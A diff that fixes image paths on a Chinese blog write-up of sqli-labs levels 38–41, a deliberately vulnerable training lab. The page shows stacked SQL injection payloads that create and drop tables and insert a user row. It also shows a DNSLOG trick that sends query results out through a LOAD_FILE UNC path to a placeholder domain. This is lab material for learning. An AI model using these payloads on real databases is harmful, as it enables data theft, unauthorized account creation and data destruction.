@@ -29,15 +29,15 @@
 <meta property="og:site_name" content="WJW&#39;s Blog">
 <meta property="og:description" content="读文件——DNSLOG外带使用网站http:&#x2F;&#x2F;dnslog.cn&#x2F;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/.com//1.png">
-<meta property="og:image" content="http://example.com/.com//0.png">
-<meta property="og:image" content="http://example.com/.com//2.png">
+<meta property="og:image" content="http://example.com/2020/12/12/sqli-labs/38/38.md/1.png">
+<meta property="og:image" content="http://example.com/2020/12/12/sqli-labs/38/38.md/0.png">
+<meta property="og:image" content="http://example.com/2020/12/12/sqli-labs/38/38.md/2.png">
 <meta property="article:published_time" content="2020-12-12T04:35:34.000Z">
 <meta property="article:modified_time" content="2021-07-27T02:01:29.283Z">
 <meta property="article:author" content="WJW">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/.com//1.png">
+<meta name="twitter:image" content="http://example.com/2020/12/12/sqli-labs/38/38.md/1.png">
 
 <link rel="canonical" href="http://example.com/2020/12/12/sqli-labs/38/">
 
@@ -267,8 +267,8 @@
 <h4 id="UNC路径-只存在windows系统"><a href="#UNC路径-只存在windows系统" class="headerlink" title="UNC路径(只存在windows系统)"></a>UNC路径(只存在windows系统)</h4><p>格式：\servername\sharename,其中severname是服务器名，sharename是共享资源的名称。<br><code>?id=1&#39;;select 1,2,LOAD_FILE(group_concat(&#39;\\\\&#39;),mysql查询语句,&#39;域名\\abc&#39;)</code><br>第一个相当于转义两个\,可以把想要的信息放在子域名。</p>
 <h3 id="堆叠注入。"><a href="#堆叠注入。" class="headerlink" title="堆叠注入。"></a>堆叠注入。</h3><p><strong>mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</strong></p>
 <p>复习一下，调用数据库时，可以不加；</p>
-<h3 id="38"><a href="#38" class="headerlink" title="38"></a>38</h3><p>通过与注入点加;分隔开加新的注入。<br>打开后台数据库检验。<br>创表<br><code>?id=1&#39;;create table test like users--+</code><br><img src="/.com//1.png"><br><img src="/.com//0.png"></p>
-<p>还可以直接用MySQL语句创表：<br><code>?id=1&#39;;insert into users(id,username,password)values(16,&#39;fafu&#39;,&#39;fafu&#39;)--+</code>记得字符要加单引号或者双引号。<br><img src="/.com//2.png"><br><code>?id=1&#39;;create table test like aaa;</code>后面加分号也可以的。<br><code>?id=1&#39;;drop table test--+</code><br><strong>补充：这里创表需要加like users 是因为创表需要知道字段名还有字段类型。</strong></p>
+<h3 id="38"><a href="#38" class="headerlink" title="38"></a>38</h3><p>通过与注入点加;分隔开加新的注入。<br>打开后台数据库检验。<br>创表<br><code>?id=1&#39;;create table test like users--+</code><br><img src="38.md/1.png"><br><img src="38.md/0.png"></p>
+<p>还可以直接用MySQL语句创表：<br><code>?id=1&#39;;insert into users(id,username,password)values(16,&#39;fafu&#39;,&#39;fafu&#39;)--+</code>记得字符要加单引号或者双引号。<br><img src="38.md/2.png"><br><code>?id=1&#39;;create table test like aaa;</code>后面加分号也可以的。<br><code>?id=1&#39;;drop table test--+</code><br><strong>补充：这里创表需要加like users 是因为创表需要知道字段名还有字段类型。</strong></p>
 <h3 id="39"><a href="#39" class="headerlink" title="39"></a>39</h3><p>为数字型，也是堆叠注入。</p>
 <h3 id="40"><a href="#40" class="headerlink" title="40"></a>40</h3><p>改成’)即可</p>
 <h3 id="41"><a href="#41" class="headerlink" title="41"></a>41</h3><p>也是数字型注入,错误不回显，盲注。</p>
